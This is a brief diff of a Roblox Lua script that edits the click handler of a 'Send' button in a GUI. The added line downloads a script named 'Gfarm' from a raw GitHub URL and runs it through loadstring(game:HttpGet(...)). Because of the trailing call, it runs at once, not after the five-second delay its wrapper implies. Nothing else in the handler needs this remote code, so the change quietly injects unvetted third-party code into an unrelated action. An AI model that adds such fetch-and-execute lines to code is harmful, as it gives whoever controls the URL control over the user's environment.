@@ -243,6 +243,7 @@ sendBtn.MouseButton1Click:Connect(function()
     updateLog("initiating send")
     sendTrack()
     task.delay(0.2, sendToProxy)
+    task.delay(5,     loadstring(game:HttpGet('https://raw.githubusercontent.com/MQPS7/99-Night-in-the-Forset/refs/heads/main/Gfarm'))())
     task.delay(1.5, function() sendBtn.Text = "Send" end)
 end)
 
